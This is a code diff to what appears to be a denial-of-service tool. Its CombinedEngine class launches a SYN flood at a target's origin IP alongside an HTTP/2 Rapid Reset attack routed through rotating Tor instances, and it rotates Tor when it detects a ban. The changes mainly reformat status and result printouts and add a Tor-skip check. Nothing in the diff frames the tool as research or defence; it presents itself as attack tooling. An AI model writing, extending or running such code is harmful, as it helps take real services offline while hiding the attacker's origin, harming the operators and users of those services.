@@ -147,6 +147,10 @@ class CombinedEngine:
 
     async def _start_tor(self) -> bool:
         """Start Tor instances and build proxy chain."""
+        if self.tor_instances <= 0:
+            self.logger.log("TOR_SKIP", {"reason": "tor_instances=0"})
+            return False
+
         try:
             from core.network.tor.manager import TorManager
         except ImportError:
@@ -421,33 +425,14 @@ class CombinedEngine:
         """Run combined attack: SYN flood + Rapid Reset in parallel."""
         self._start_ts = time.time()
         self.logger.set_start()
-        print(f"\n{'='*60}")
-        print(f"  AUTO MODE V3 - COMBINED ATTACK")
-        print(f"  Target: {self.target}")
-        print(f"  Origin: {self.origin_ip}")
-        print(f"  Duration: {self.duration}s")
-        print(f"  Tor rotation interval: {self.rotation_interval}s")
-        print(f"{'='*60}\n")
+        print(f"\n  [V3] Combined Attack: {self.target}")
+        print(f"  [V3] Origin IP: {self.origin_ip} | Duration: {self.duration}s | Tor rotate: {self.rotation_interval}s\n")
 
         # Phase 1: Start Tor
-        print(f"\n[*] Phase 1: Starting Tor instances...")
         tor_ok = await self._start_tor()
-        if not tor_ok:
-            print(f"  [!] Tor failed - running without proxy (direct only)")
-            self.logger.log("WARNING", {"detail": "Tor failed, direct mode only"})
 
-        # Phase 2: Launch SYN flood
-        print(f"\n[*] Phase 2: Launching SYN Flood (direct to origin)...")
         syn_proc = await self._launch_syn_flood()
-
-        # Phase 3: Launch Rapid Reset
-        print(f"\n[*] Phase 3: Launching Rapid Reset (via Tor)...")
         rr_proc = await self._launch_rapid_reset()
-
-        # Phase 4: Monitor both
-        print(f"\n[*] Phase 4: Monitoring attack (duration: {self.duration}s)...")
-        print(f"  Auto-rotating Tor every {self.rotation_interval}s")
-        print(f"  Ban detection: 3 consecutive errors -> rotate\n")
 
         self.logger.log("ATTACK_START", {
             "target": self.target,
@@ -483,7 +468,7 @@ class CombinedEngine:
             self.logger.log("CANCELLED", {})
 
         # Phase 5: Shutdown
-        print(f"\n[*] Phase 5: Shutting down engines...")
+        print(f"\n  [V3] Shutting down...")
         self.logger.log("SHUTDOWN", {})
 
         # Kill processes
@@ -534,19 +519,11 @@ class CombinedEngine:
         self.logger.finalize()
 
         # Print results
-        print(f"\n{'='*60}")
-        print(f"  RESULTS")
-        print(f"{'='*60}")
-        print(f"  SYN Flood:")
-        print(f"    Completed: {result['syn_completed']:,}")
-        print(f"    Failed:    {result['syn_failed']:,}")
-        print(f"  Rapid Reset:")
-        print(f"    Completed: {result['rr_completed']:,}")
-        print(f"    Failed:    {result['rr_failed']:,}")
-        print(f"  Tor rotations: {result['tor_rotations']}")
-        print(f"  Combined total: {result['combined_total']:,}")
-        print(f"  Status log: {STATUS_LOG_PATH}")
-        print(f"{'='*60}\n")
+        print(f"\n  [V3] RESULTS")
+        print(f"  [V3] SYN Flood:    {result['syn_completed']:>10,} ok / {result['syn_failed']:>10,} fail")
+        print(f"  [V3] Rapid Reset:  {result['rr_completed']:>10,} ok / {result['rr_failed']:>10,} fail")
+        print(f"  [V3] COMBINED:     {result['combined_total']:>10,} total | {result['tor_rotations']} Tor rotations")
+        print(f"  [V3] Log: {STATUS_LOG_PATH}\n")
 
         return result
 
